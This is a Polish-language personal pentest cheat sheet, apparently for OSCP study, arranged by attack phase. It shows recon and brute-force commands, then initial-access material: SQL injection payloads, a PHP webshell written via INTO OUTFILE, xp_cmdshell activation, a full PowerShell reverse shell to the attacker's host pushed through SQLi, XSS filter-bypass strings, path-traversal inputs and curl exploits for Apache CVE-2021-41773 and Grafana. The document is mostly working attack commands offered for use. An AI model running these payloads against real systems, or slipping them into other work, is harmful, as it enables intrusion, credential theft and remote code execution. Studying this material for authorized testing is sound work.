# 🗡️ Pentest Playbook — Kill Chain Edition

> Osobista ściąga uporządkowana wg **faz ataku** (cyber kill chain), a nie wg narzędzi.
> Kiedy jesteś na danym etapie zaczepienia — wchodzisz do odpowiedniego rozdziału i masz wszystko pod ręką.
>
> Oryginalny, „płaski” plik trzymam jako backup w **`Commands.md`**.

---

## 📑 Spis treści / Nawigacja

| # | Faza | Co tu znajdziesz |
|---|------|------------------|
| [0](#0-setup--zmienne-robocze) | **Setup** | Zmienne robocze, konwencje |
| [1](#1-recon--enumeration-rozpoznanie) | **Recon & Enumeration** | Nmap, web, DNS, SMB, SNMP, LDAP, RPC, AD user enum, hydra, vuln scan (NSE/Nessus) |
| [2](#2-initial-access--exploitation-uzyskanie-dostepu) | **Initial Access / Exploitation** | SQLi, LFI/RFI, upload, cmd injection, SSTI, XSS, SQLMap, API, reverse shells, TTY, exploity, Metasploit, client-side |
| [3](#3-post-exploitation--situational-awareness) | **Situational Awareness** | Rozpoznanie lokalne Linux / Windows |
| [4](#4-privilege-escalation-eskalacja-uprawnien) | **Privilege Escalation** | Linux (SUID/sudo/cron/caps) i Windows (services/DLL/registry) |
| [5](#5-credential-access-pozyskiwanie-poswiadczen) | **Credential Access** | John, hashcat, *2john, spraying, mimikatz, Kerberos, Responder, NTLM relay |
| [6](#6-active-directory) | **Active Directory** | BloodHound, PowerView, net/wmic, MSSQL |
| [7](#7-lateral-movement-ruch-boczny) | **Lateral Movement** | PsExec/WinRM/sc/WMI, PtH/PtT/PtK, RDP hijack |
| [8](#8-pivoting--port-forwarding) | **Pivoting** | SSH tunnels, socat, chisel, proxychains, DPI/DNS tunneling (dnscat2) |
| [9](#9-exfiltration--file-transfer) | **Exfiltration & Transfer** | Przerzucanie plików w obie strony |
| [10](#10-persistence--backdooring) | **Persistence** | Backdoory, scheduled tasks |
| [11](#11-blue-team--forensics) | **Blue Team / Forensics** | Detekcja, ausearch, analiza plików Windows |
| [12](#12-toolbox--reference) | **Toolbox** | grep, awk, find, xxd, git i inne narzędzia bazowe |
| [13](#13-cloud--aws-enumeracja-i-atak) | **Cloud (AWS)** | S3, IAM, EC2, Lambda — enumeracja i eskalacja w chmurze |
| [14](#14-reporting--technical-report) | **Reporting** | Notatki, struktura raportu, PoC, remediation, walkthrough |
| [15](#15-wszystko-i-nic-worklog--stuck-buster) | **Wszystko i nic** | Worklog utkniętych maszyn: co zrobione + co spróbować dalej |
| [A](#appendix-a--skroty-klawiszowe-shell) | **Appendix A** | Skróty klawiszowe shella |
| [B](#appendix-b--oscp-exam-playbook--metodyka) | **Appendix B** | OSCP exam playbook — metodyka, checklisty, pułapki |

---

## 0. Setup / Zmienne robocze

> Ustaw zmienne na początku sesji — wtedy komendy niżej kopiujesz 1:1 bez podmieniania IP.

```bash
export IP=10.10.10.10          # cel
export LHOST=10.14.0.1         # twój tun0 (sprawdź: ip a show tun0)
export LPORT=4444
export DOMAIN=tryhackme.loc
export DC=10.211.11.10         # domain controller
```

**Legenda placeholderów używanych niżej:** `TARGET_IP` = cel, `ATTACKER_IP`/`LHOST` = twoja maszyna, `DC` = kontroler domeny.

**Szybki start rozpoznania (odpal i idź parzyć kawę):**
```bash
sudo nmap --privileged -p- -sV -sC -T4 -v -oN nmap_full.txt $IP
```

---

# 1. Recon & Enumeration (Rozpoznanie)

> Cel fazy: zmapować powierzchnię ataku — otwarte porty, usługi, wersje, domeny, share'y, użytkownicy.
> **Zasada:** enumerate → enumerate → enumerate. 90% pracy to rozpoznanie.

> 🎯 **Drogowskaz — co po kolei:** 1) szybki ping-sweep (§1.1) → lista żywych hostów. 2) nmap `-sС -sV` na każdym (§1.2) → usługi+wersje. 3) każdy port ma swój tor: 80/443→web (§1.3), 445→SMB (§1.5), 389→LDAP (§1.7), 88→Kerberos/AD (§1.8), 161→SNMP (§1.6). 4) pełny `-p-` w tle, gdy grzebiesz w tym co znalazłeś.
> 💎 **Co wartościowe:** wersje usług (→ searchsploit) · anonymous/guest na SMB/FTP · `description` w LDAP · listę userów (→ spraying/AS-REP) · transfer strefy DNS · nietypowe wysokie porty.

## 1.1 Host discovery (co żyje w sieci?)

Sweep po zakresie IP (reverse DNS):
```bash
for ip in $(seq 64 79); do host 167.114.21.$ip; done | grep -Ev "not found|timed out"
```

Ping sweep / szybkie wykrycie żywych hostów (bez skanu portów):
```bash
nmap -sn 10.10.10.0/24 -oN live_hosts.txt          # -sn = ping scan, no ports
fping -a -g 10.10.10.0/24 2>/dev/null              # szybsza alternatywa
```

## 1.2 Port scanning — Nmap

Pełny, dokładny skan (mój domyślny):
```bash
nmap --privileged -p- -sV -sC -T4 -v -oN nmap_pelen_skan.txt $IP
# -p-  wszystkie 65535 portów | -sV wersje | -sC skrypty default | -T4 szybko | -oN zapis
```

**Trik dwuetapowy (szybko → głęboko)** — najpierw znajdź otwarte porty, potem skanuj tylko je:
```bash
ports=$(nmap -p- --min-rate=1000 -T4 $IP | grep '^[0-9]' | cut -d/ -f1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -sV -sC -A -oN nmap_deep.txt $IP
```

UDP (wolne — celuj w konkretne porty; SNMP/DNS/TFTP/IKE):
```bash
sudo nmap -sU --top-ports 20 -oN nmap_udp.txt $IP
```

**Wybór typu skanu:** `-sS` (SYN/half-open, domyślny gdy root — szybki, cichy) · `-sT` (connect, bez roota/przez proxy — wolniejszy, wpada w logi apki) · `-Pn` (host blokuje ICMP → traktuj jako up) · `-O --osscan-guess` (fingerprint OS ze stacku TCP/IP).

**Sweep całej podsieci (greppable `-oG` → potok):**
```bash
nmap -v -sn 192.168.50.1-253 -oG ping-sweep.txt && grep Up ping-sweep.txt | cut -d" " -f2   # lista żywych
nmap -p80,443 192.168.50.1-253 -oG web-sweep.txt && grep open web-sweep.txt | cut -d" " -f2  # kto ma web
```
**Netcat fallback (gdy brak nmapa na hoście):**
```bash
nc -nvv -w 1 -z $IP 3388-3390          # TCP: 'open' vs 'refused' (RST); -z zero-I/O, -w1 timeout
nc -nv -u -z -w 1 $IP 120-123          # UDP: brak odpowiedzi=open, ICMP unreachable=closed
```

Kategorie skryptów NSE (świetne do enumeracji):
```bash
nmap -p445 --script smb-enum-shares $IP           # które share dają RW
nmap -v -p 139,445 --script smb $IP               # cała rodzina skryptów SMB
nmap -p445 --script "vuln" $IP                     # znane podatności
ls /usr/share/nmap/scripts/ | grep smb             # przegląd dostępnych skryptów
```
> **Banner → wersja OS** (precyzyjny OS bez `-O`, zawęża CVE): `OpenSSH 8.9p1 Ubuntu 3` = 22.04 Jammy · `8.2p1` = 20.04 · `7.6p1` = 18.04 (potwierdź na launchpad.net). `Apache 2.4.x (Ubuntu)` / `IIS 10.0` = rodzina Windows Server. Brak numeru wersji (np. hMailServer) ≠ bezpieczne — szukaj CVE ręcznie.

## 1.3 Web enumeration

> 🎯 **Drogowskaz — web app (co po kolei):** 1) `nmap -p80 -sV --script=http-enum` → baner + apki/foldery/listing. 2) `whatweb`/Wappalyzer + **DevTools** → stack, wersje bibliotek JS (→ CVE), ukryte inputy, komentarze. 3) dopisz host do `/etc/hosts` (linki/redirecty po nazwie). 4) gobuster/ffuf — czytaj kody: **200** jest · **301/302** katalog · **403** jest+zabronione · **405** endpoint istnieje, zła metoda (→ verb tampering). 5) odpal **Burp** (proxy 127.0.0.1:8080). 6) `/robots.txt`, `/sitemap.xml`, view-source, nagłówki. 7) każdy input testuj: SQLi/LFI/upload/cmdi/XSS.
> 💎 **Co wartościowe:** wersje bibliotek JS (searchsploit) · directory listing ON · ukryte pola/komentarze · baner dev-server (Werkzeug/Python → exploit) · katalogi admin/backup.

```bash
sudo nmap -p80 --script=http-enum $IP                  # /login.php, znane apki (WordPress/BlogWorx), foldery admin, listing
echo "$IP target.thm" | sudo tee -a /etc/hosts         # apki osadzają hostname w linkach/redirectach — bez wpisu "connection refused"
```
> **DevTools (Firefox):** Debugger → *Pretty print* de-minifikuje JS (frameworki, wersje → CVE); Inspector → ukryte `input hidden`; Console (Ctrl+Shift+K) → testuj JS.

### Gobuster
```bash
gobuster dir -u http://$IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -t 40 -x php,txt,bak,tar.gz,zip,html -o gobuster.txt -b 404,400
# -x rozszerzenia | -b blacklist kodów statusu | -t wątki
```
Vhosty (wirtualne hosty na tym samym IP):
```bash
gobuster vhost -u http://$IP -w /usr/share/wordlists/amass/subdomains-top1mil-5000.txt -o vhosts.txt
```

### ffuf — szybszy i elastyczniejszy (warto znać obok gobustera)
```bash
# Katalogi
ffuf -u http://$IP/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 60
# Vhost fuzzing (filtruj po rozmiarze odpowiedzi -fs, żeby uciąć śmieci)
ffuf -u http://$IP -H "Host: FUZZ.$DOMAIN" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 4242
# Parametry GET
ffuf -u "http://$IP/page?FUZZ=1" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs 0
```

> 💡 **Zawsze** sprawdź źródło strony, `/robots.txt`, `/sitemap.xml`, nagłówki (`curl -I`), technologie (`whatweb $IP`), oraz komentarze w HTML. `nikto -h http://$IP` na szybki przegląd.

## 1.4 DNS

```bash
dnsenum $DOMAIN
dnsrecon -d $DOMAIN -t std                          # standard
dnsrecon -d $DOMAIN -D ~/wordlist.txt -t brt        # brute subdomen
# Strefowy transfer (jackpot, jeśli zadziała):
dig axfr @$IP $DOMAIN
# Lekko/ręcznie:
host -t mx $DOMAIN; host -t txt $DOMAIN              # MX (niższy numer=wyższy priorytet), TXT (tokeny/hinty)
for n in $(cat list.txt); do host $n.$DOMAIN; done | grep -v "not found"   # forward brute
gobuster dns -d $DOMAIN -w wordlist.txt -t 10        # (gobuster >3.6: --do zamiast -d)
```
> Forward-brute daje rozrzucone IP w tym zakresie → potem reverse-PTR sweep tego /24 = kolejne nazwane hosty (rekon jest **cykliczny**).

## 1.4b Pasywny OSINT (zanim dotkniesz celu)
> ⚠️ Na egzaminie OSCP faza pasywna prawie się nie liczy (brak internetowego OSINT) — na realnym teście jednak seeduje userów/maile i netbloki.
```bash
whois $DOMAIN -h <whois_ip>            # Registrant/Admin: name+org+phone+email + Name Servery
whois $IP -h <whois_ip>                # reverse → ISP/CIDR (kolejne cele skanów)
```
> **Google dorks:** `site:cel.com filetype:txt` · `intitle:"index of"` · `site:cel.com inurl:admin` · `site:cel.com "username" "password"` · `site:cel.com -www` (subdomeny). **Third-party (niski footprint):** Netcraft/Wappalyzer (stack), Shodan (`hostname:cel.com` → banner+CVE), securityheaders.com, ssllabs.com. **Sekrety w repo:** `gitleaks detect --source <repo>`, `gitrob <org>` (regex+entropia; zwykle potrzeba PAT).

## 1.4c Windows LOLBAS recon (assumed breach — bez Kali, bez internetu)
> Na zablokowanym hoście AD robisz DNS + skan portów **wbudowanym Windowsem**. Kluczowe egzaminacyjnie.
```powershell
nslookup mail.corp.com                                 # A; -type=TXT/MX <host> <dns-server>
Test-NetConnection -Port 445 192.168.50.151            # TcpTestSucceeded:True = open (ICMP+1 port)
1..1024 | % { echo ((New-Object Net.Sockets.TcpClient).Connect("10.10.10.5",$_)) "port $_ open" } 2>$null   # lekki skan portów
```
```cmd
net view \\dc01 /all                                   :: share'y (ADMIN$/C$/IPC$) + komentarze
```

## 1.5 SMB / NetBIOS (porty 139, 445)

> Port **139** = NetBIOS (stare, komunikacja w LAN); port **445** = SMB.

```bash
sudo nbtscan -r 10.10.10.0/24                       # -r skanuje NetBIOS 137
```
Listowanie i anonimowe logowanie:
```bash
smbclient -L //$IP -N                               # -N = null session (bez hasła)
smbclient //$IP/SHARE_NAME -N                       # podłącz się do konkretnego share
smbmap -H $IP                                        # pokazuje uprawnienia R/W per share
smbmap -H $IP -u guest                               # spróbuj z kontem guest
```
enum4linux-ng (users, groups, shares, policy, RID cycling):
```bash
enum4linux-ng -A $IP -oA results/scan
# -A = wszystkie funkcje | -oA = zapis do YAML + JSON
```
CrackMapExec — szwajcarski scyzoryk SMB/LDAP/WinRM:
```bash
crackmapexec smb $IP --pass-pol                      # polityka haseł (bez creds jeśli anon)
crackmapexec smb $IP -u users.txt -p passwords.txt   # password spray
crackmapexec smb $IP -u user -p pass --shares        # listuj share'y z poświadczeniami
crackmapexec smb $IP -u user -p pass --sam           # dump SAM (jeśli admin)
# Wskazówka: (Pwn3d!) w outputcie = masz admina na tym hoscie
```

### rpcclient (MSRPC przez SMB)
```bash
rpcclient -U "" $IP -N                                # -U "" pusty user, -N bez hasła (anon)
```
Wewnątrz konsoli: `enumdomusers`, `enumdomgroups`, `queryuser 0x1f4`, `queryuser <RID>`.
> RID **500** = Administrator, **501** = Guest, **512-514** = Domain Admins/Users/Guests. Konta użytkowników zwykle od **1000** w górę.

RID cycling (wyciągnij userów po RID-ach):
```bash
for i in $(seq 500 2000); do \
  user=$(echo "queryuser $i" | rpcclient -U "" -N $IP 2>/dev/null | grep -i "User Name"); \
  if [ -n "$user" ]; then echo "[RID: $i] $user"; fi; done
```
Wycinanie userów z outputu enumdomusers (`[nazwa]` → users.txt):
```bash
awk -F'[][]' '{print $2}' rpc_wynik.txt > users.txt
# -F'[][]' ustawia [ oraz ] jako separatory | print $2 = to co między pierwszym [ a ]
```

## 1.5b SMTP (port 25) — enum userów
```bash
nc -nv $IP 25                          # po połączeniu:
VRFY root                              # 252 = akceptowany/prawdopodobny · 550 = unknown (skryptuj po userliście)
# EXPN <lista> = członkowie listy mailingowej; Windows bez Kali: dism /online /Enable-Feature /FeatureName:TelnetClient → telnet $IP 25
```
> `252` nie potwierdza usera w 100% (serwer bywa „accept-and-attempt"), ale zawęża listę do sprayingu/phishingu.

## 1.6 SNMP (port 161/UDP)

> MIB Table zawiera kody OID. Community string domyślnie `public` (read).

```bash
snmpwalk -c public -v1 -t 10 $IP                      # cały MIB tree (-t 10 = timeout 10s)
snmpwalk -c public -v1 $IP 1.3.6.1.4.1.77.1.2.25       # konta użytkowników
snmpwalk -c public -v1 $IP 1.3.6.1.2.1.25.4.2.1.2      # uruchomione procesy
snmpwalk -c public -v1 $IP 1.3.6.1.2.1.25.6.3.1.2      # zainstalowane oprogramowanie
snmpwalk -c public -v1 $IP 1.3.6.1.2.1.6.13.1.3        # otwarte porty TCP
# Zgadywanie community stringów:
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt $IP
```

## 1.7 LDAP (port 389 / 636)

Test anonimowego bindu:
```bash
ldapsearch -x -H ldap://$IP -s base                   # -x prosta auth (anon), -s base tylko obiekt bazowy
```
Dump użytkowników z DC:
```bash
ldapsearch -x -H ldap://$IP -b "dc=tryhackme,dc=loc" "(objectClass=person)"
# Ciekawe: szukaj haseł w polu description
ldapsearch -x -H ldap://$IP -b "dc=tryhackme,dc=loc" "(objectClass=user)" description
```

## 1.8 AD user enumeration (bez poświadczeń)

### kerbrute — walidacja userów po Kerberos pre-auth (cichsze niż SMB brute)
```bash
kerbrute userenum --dc $DC -d $DOMAIN /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```
> Najpierw enumeruj (enum4linux/rpc/ldap), zbuduj `users.txt`, a `kerbrute` potwierdzi które konta istnieją, są aktywne i nie są honeypotami.

### AS-REP Roasting (GetNPUsers) — konta bez wymaganego pre-auth
```bash
impacket-GetNPUsers $DOMAIN/ -dc-ip $DC -usersfile users.txt -format hashcat -outputfile hashes.txt -no-pass
# Zbiera hashe AS-REP dla podatnych kont → łamiesz offline (hashcat -m 18200)
```

## 1.9 Online password attacks (hydra + budowanie list)

> Brute force **usług sieciowych** (nie hashy — to §5). Zawsze najpierw spróbuj defaultów i creds znalezionych w enumeracji.

### Hydra — najczęstsze protokoły
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://$IP
hydra -L users.txt -P pass.txt ftp://$IP
hydra -l admin -P rockyou.txt rdp://$IP
hydra -L users.txt -P pass.txt $IP smb                       # -t 1 (SMB nie lubi wielu wątków)
# HTTP POST form — F=marker błędu, ^USER^/^PASS^ podstawiane
hydra -l admin -P rockyou.txt $IP http-post-form \
  "/login.php:user=^USER^&pass=^PASS^:F=Invalid credentials"
# HTTP Basic Auth
hydra -L users.txt -P pass.txt $IP http-get /admin/
```
> Alternatywy: `crackmapexec smb $IP -u users.txt -p pass.txt` (spray), `netexec`, `medusa`, `patator`.

### Budowanie celowanych wordlist
```bash
cewl -d 3 -m 5 -w wordlist.txt http://$IP                    # słowa ze strony celu
# Mutacje hasłami (dopisz cyfry/znaki) — hashcat rules:
hashcat --stdout wordlist.txt -r /usr/share/hashcat/rules/best64.rule > mutated.txt
# Generowanie loginów z imion i nazwisk:
./Scripts/username_generator/username_generator.py   # własny skrypt w repo
# username-anarchy (imię.nazwisko, inicjały itd.):
username-anarchy Jan Kowalski > users.txt
```
> 💡 Własne skrypty pomocnicze masz w `./Scripts/` (LFI scanner, RPC enum, session bruteforce, php_mt_seed, PadBuster do padding oracle).

## 1.10 Vulnerability scanning (skanery + NSE)

> Skanery automatyzują dopasowanie „wersja usługi → znane CVE”. Traktuj wynik jako **trop, nie dowód** — zawsze weryfikuj ręcznie (false-positive/negative). Na OSCP: automaty jako uzupełnienie enumeracji, nigdy zamiast niej.

### Nmap NSE — skrypty vuln
```bash
ls /usr/share/nmap/scripts | grep -i vuln           # co jest dostępne lokalnie
grep '"vuln"' /usr/share/nmap/scripts/script.db      # skrypty z kategorii vuln
sudo nmap -sV -p 443 --script "vuln" $IP             # cała kategoria vuln (głośne, intrusive)
sudo nmap -sV --script "http-vuln*" $IP              # wybrany zestaw po nazwie
sudo nmap -sV --script vulners $IP                   # vulners: wersja → CVE + linki do exploitów
```
### Dodanie własnego skryptu NSE (np. świeży CVE z GitHuba)
```bash
sudo cp http-vuln-cve2021-41773.nse /usr/share/nmap/scripts/
sudo nmap --script-updatedb                          # przebuduj bazę skryptów
sudo nmap -sV -p 443 --script "http-vuln-cve2021-41773" $IP
```
### Nessus (GUI, kompleksowy skaner)
```bash
sudo dpkg -i Nessus-*.deb        # instalacja z .deb (Kali)
sudo systemctl start nessusd     # start usługi; https://kali:8834/
```
> **Basic Network Scan** = baseline (perspektywa sieciowa). **Credentialed Patch Audit** (New Scan → Credentials → Host → SSH: password/user/pass, *Elevate with sudo*) = brakujące patche + **lokalny privesc** (Baron Samedit CVE-2021-3156, HiveNightmare) — niewidoczne w skanie unauth! Linux=SSH, Windows=SMB+WMI. **Advanced Dynamic Scan** → *Dynamic Plugins* filtr `CVE is equal to CVE-XXXX` = przeczesanie pod jeden CVE. ⚠️ backport = string starej wersji → **false positive**; każdy finding = trop, nie dowód.

> Inne skanery: **nikto** `nikto -h http://$IP`, **nuclei** `nuclei -u http://$IP`.
> **wpscan (WordPress) — pluginy to miękki cel** (foothold zwykle przez przeterminowany plugin, nie rdzeń):
```bash
curl -s http://$IP | grep -Eo 'wp-content|wp-includes|wp-json'      # potwierdź WordPress
wpscan --url http://$IP --enumerate vp,u,t --plugins-detection aggressive -o wpscan.txt   # vuln plugins, users, themes
wpscan --url http://$IP --enumerate ap --plugins-detection aggressive --api-token <TOKEN>  # ALL pluginy + baza CVE
```
> „out of date" plugin → `searchsploit <plugin> <wersja>` (§2.12) → często arbitrary file read → `/etc/passwd` + `id_rsa`. Wersja pluginu bywa w `/wp-content/plugins/<x>/readme.txt`.

---

# 2. Initial Access / Exploitation (Uzyskanie dostępu)

> Cel fazy: pierwszy shell / pierwsze poświadczenia. Web, słabe hasła, znane CVE.

## 2.1 Web attacks — SQL Injection

> 🎯 **Drogowskaz — SQLi → RCE:** 1) **fingerprint DBMS** (`@@version`/`version()` — styl komentarzy i RCE różnią się per silnik). 2) masz creds/otwarty port? wejdź natywnie (poniżej) i enumeruj obok SQLi. 3) potwierdź injekcję (sama `'` = błąd składni) → `OR 1=1`/UNION/blind. 4) enumeruj: user → privileged? → bazy → tabele (`information_schema`/`sys.databases`), celuj w **custom** DB. 5) dump hashy → crack. 6) RCE: MSSQL `xp_cmdshell` · MySQL `INTO OUTFILE`. 7) blind/za wolno → sqlmap (głośny, na exam do identyfikacji).

**Natywny klient (gdy masz creds / otwarty 3306/1433) — szybsze niż przez SQLi:**
```bash
mysql -u root -p'root' -h $IP -P 3306 --skip-ssl      # ERROR 2026 TLS → --skip-ssl; potem: select version(); system_user();
#   SELECT user,authentication_string FROM mysql.user;   -- hashe MySQL8 (Caching-SHA-256) do łamania
impacket-mssqlclient sa:Passw0rd@$IP -windows-auth     # MSSQL; SELECT name FROM sys.databases; select * FROM baza.dbo.users;
#   pomijaj master/tempdb/model/msdb; schemat dbo między bazą a tabelą; zdalnie OMIŃ końcowe GO
```

### Blind boolean-based (inference, gdy apka różnicuje output — szybsze niż time)
```
offsec'                                  -- sama apostrofa = błąd składni = injekcja potwierdzona
?user=offsec' AND 1=1 -- //              -- zwraca rekord (TRUE)
?user=offsec' AND 1=2 -- //              -- nic (FALSE) → wnioskuj bit po bicie
```

### Boolean-based (autoryzacja / logika)
```sql
offsec' OR 1=1 -- //
' or 1=1 in (select @@version) -- //
' OR 1=1 in (SELECT * FROM users) -- //
' or 1=1 in (SELECT password FROM users) -- //
' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //
```

### UNION-based (wyciąganie danych)
```sql
-- 1. Ustal liczbę kolumn
' ORDER BY 1-- //          -- zwiększaj aż poleci błąd
-- 2. Potwierdź liczbę kolumn i pozycje wyświetlane
%' UNION SELECT 'a1','a2','a3','a4','a5' -- //
-- 3. Enumeracja bazy
' UNION SELECT null,null,database(),user(),@@version -- //
-- 4. Tabele i kolumny
' union select null,table_name,column_name,table_schema,null from information_schema.columns where table_schema=database() -- //
-- 5. WebShell na dysk (INTO OUTFILE)
' UNION SELECT "<?php system($_GET['cmd']);?>",null,null,null,null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
-- następnie: http://TARGET_IP/tmp/webshell.php?cmd=id
```

### Blind (time-based)
```sql
' AND IF (1=1, sleep(3),'false') -- //
```

### MSSQL — RCE przez xp_cmdshell
```bash
impacket-mssqlclient Administrator:Lab123@$IP -windows-auth   # 1. wejdź do bazy
```
```sql
EXECUTE sp_configure 'show advanced options',1; RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell',1; RECONFIGURE;
EXECUTE xp_cmdshell 'whoami';
```

### ASP.NET WebForms (`.aspx` login) SQLi → RCE — manualnie przez curl

> Klasyk OSCP (np. challenge „Medtech"): formularz `login.aspx` z polami `...$UsernameTextBox`/`...$PasswordTextBox`. Dwie pułapki, przez które łatwo uznać, że „nie ma injekcji":
> 1. **VIEWSTATE:** KAŻDY POST musi nieść świeże `__VIEWSTATE`, `__VIEWSTATEGENERATOR`, `__EVENTVALIDATION` pobrane GET-em tuż przed. Bez tego serwer zwraca **HTTP 500 (viewstate MAC)** — a wysłanie poprawnych tokenów i dostanie 200 to zarazem **dowód, że POST jest przetwarzany**.
> 2. **Pusta tabela userów:** `OR 1=1` nie zaloguje i error-based przez `WHERE` milczy (brak wierszy do ewaluacji predykatu). Nie odpuszczaj — testuj **stacked queries** i **time-based**.

**Krok 1 — funkcja pobierająca świeże tokeny i strzelająca payloadem (skopiuj do terminala):**
```bash
URL="http://$IP/login.aspx"
inject(){
  # 1) GET — wyciągnij świeże tokeny WebForms
  page=$(curl -s "$URL")
  vs=$(echo "$page"  | grep -oP 'id="__VIEWSTATE" value="\K[^"]+')
  vg=$(echo "$page"  | grep -oP 'id="__VIEWSTATEGENERATOR" value="\K[^"]+')
  ev=$(echo "$page"  | grep -oP 'id="__EVENTVALIDATION" value="\K[^"]+')
  # 2) POST — wstrzyknij w pole username ($1), zmierz czas i rozmiar odpowiedzi
  curl -s -o /tmp/resp.html -w "czas=%{time_total}s rozmiar=%{size_download}B kod=%{http_code}\n" "$URL" \
    --data-urlencode "__VIEWSTATE=$vs" \
    --data-urlencode "__VIEWSTATEGENERATOR=$vg" \
    --data-urlencode "__EVENTVALIDATION=$ev" \
    --data-urlencode 'ctl00$ContentPlaceHolder1$UsernameTextBox='"$1" \
    --data-urlencode 'ctl00$ContentPlaceHolder1$PasswordTextBox=x' \
    --data-urlencode 'ctl00$ContentPlaceHolder1$LoginButton=Login'
}
```

**Krok 2 — potwierdź injekcję i silnik (error-based, `customErrors` zwykle OFF):**
```bash
inject "' OR 1=1#"        # '#' nie jest komentarzem w MSSQL -> pelny stack trace
grep -i "SqlException\|Incorrect syntax\|Unclosed" /tmp/resp.html
#   -> "System.Data.SqlClient.SqlException: Incorrect syntax near '#'" = MSSQL + webroot ze sciezki w bledzie
```

**Krok 3 — stacked queries (najkrótsza droga do RCE) + rola sysadmin:**
```bash
inject "';WAITFOR DELAY '0:0:5'-- -"                                   # czas ~5s = stacked dziala
inject "';IF IS_SRVROLEMEMBER('sysadmin')=1 WAITFOR DELAY '0:0:5'-- -" # ~5s = jestesmy sysadmin
```

**Krok 4 — włącz `xp_cmdshell` i wykonaj komendę (każdy payload = osobny `inject`):**
```bash
inject "';EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;-- -"
inject "';EXEC master..xp_cmdshell 'ping -n 4 <TWOJ_KALI>'-- -"        # potwierdz na: sudo tcpdump -i tun0 icmp
```

**Krok 5 — reverse shell (PowerShell, `-e` = base64 UTF-16LE; listener `nc -lvnp 443` PRZED):**
```bash
PSRS='$c=New-Object System.Net.Sockets.TCPClient("<TWOJ_KALI>",443);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+"PS "+(pwd).Path+"> ";$sby=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sby,0,$sby.Length);$s.Flush()};$c.Close()'
B64=$(echo -n "$PSRS" | iconv -t UTF-16LE | base64 -w0)
inject "';EXEC master..xp_cmdshell 'powershell -e $B64'-- -"
```
> Shell wraca zwykle jako `nt service\mssql$sqlexpress` → `whoami /priv` prawie zawsze ma **SeImpersonatePrivilege** → potato do SYSTEM (§4). Łup na start: `type C:\inetpub\wwwroot\web.config` (connection string `sa`) — reuse w domenie.

## 2.2 SQLMap (automatyzacja)

```bash
# Szybkie znalezienie punktu wstrzyknięcia (GET)
sqlmap -u "http://$IP/blindsqli.php?user=1" -p user
sqlmap -u "http://$IP/blindsqli.php?user=1" -p user --dump     # dump danych

# POST — podmień nazwy pól (submit, username, password wg formularza)
sqlmap -u "http://$IP/login.php" --data="pma_username=admin&pma_password=password&submit=Go" \
  --method POST --level 3 --risk 2 --batch --dbs

# Dla opornych serwerów (dodatkowe pola)
sqlmap -u "http://$IP/index.php" --data="pma_username=admin&pma_password=password&server=1&target=index.php" \
  --method POST --level 3 --risk 2 --batch --dbs

# Z zapisanego requestu Burpa (najwygodniejsze przy złożonych sesjach/nagłówkach)
sqlmap -r post.txt -p item --os-shell --web-root "/var/www/html/tmp"   # os-shell = RCE
```

## 2.3 WAF bypass / encoding (notatki)

```
URL-encoding:      / => %2f
Hex-encoding:      _ => \x5f, 0x5f
Unicode-encoding:  % => %
Mixed-case, białe znaki i komentarze do omijania filtrów:
  '/**/UNION/**/SELECT/**/1,2
XSS przez encoding znaków:
  <img src=x onerror=&#97;lert(1)>                          (decimal 'a')
  <svg onload=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>            (hex 'alert')
  <body onload=&#97;&#108;&#101;&#114;&#116;(1)>           (full decimal)
  <a/href=j&#x0D;avascript:a&#x0D;lert(1)>aaa</a>
```
**Alternatywne metody HTTP** (WAF czasem nie filtruje wszystkich):
`HEAD` (tylko nagłówki), `OPTIONS` (dozwolone metody/CORS), `PUT`/`PATCH` (update REST),
`DELETE` (usuwanie), `TRACE` (echo requestu). Test: `curl -X OPTIONS -i http://$IP/`.

## 2.4 LFI / RFI (Local / Remote File Inclusion)

> Parametr ładujący pliki (`?page=`, `?file=`, `?lang=`) → czytanie plików lub RCE.

**Podstawowy odczyt + path traversal:**
```
http://$IP/index.php?page=/etc/passwd
http://$IP/index.php?page=../../../../../../etc/passwd
http://$IP/index.php?page=....//....//....//etc/passwd     # bypass filtra ../
http://$IP/index.php?page=/etc/passwd%00                    # null byte (stare PHP <5.3.4)
```
**Ciekawe pliki do wyciągnięcia (Linux):**
```
/etc/passwd  /etc/shadow  /etc/hosts  /proc/self/environ
/var/www/html/config.php  /home/USER/.ssh/id_rsa  /root/.bash_history
/var/log/apache2/access.log   /var/log/auth.log
```
**Windows** (testuj OBA slashe — niektóre apki podatne TYLKO na `..\`; brak listowania katalogów → znaj ścieżki):
```
http://$IP/index.php?page=..\..\..\..\Windows\System32\drivers\etc\hosts
http://$IP/index.php?page=../../../../../xampp/passwords.txt          # C:\xampp\passwords.txt, apache/logs/access.log
http://$IP/index.php?page=../../../../../inetpub/wwwroot/web.config   # IIS
```
**Znane CVE traversal (gotowce):**
```bash
curl --path-as-is http://$IP/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd   # Apache 2.4.49/50 (CVE-2021-41773); %2e omija filtr ../
curl --data 'echo;id' 'http://$IP/cgi-bin/%2e%2e/%2e%2e/%2e%2e/bin/sh'        # ↑ RCE gdy mod_cgi on
curl --path-as-is http://$IP:3000/public/plugins/alertlist/../../../../../../etc/passwd   # Grafana (CVE-2021-43798); loot grafana.ini
```
> `curl` sam normalizuje kropki → **`--path-as-is`** wysyła surową ścieżkę. Zwykłe `../` często zwraca 404 mimo podatności → ZAWSZE testuj kodowanie (`%2e`, `%2f`) zanim uznasz „niepodatne".

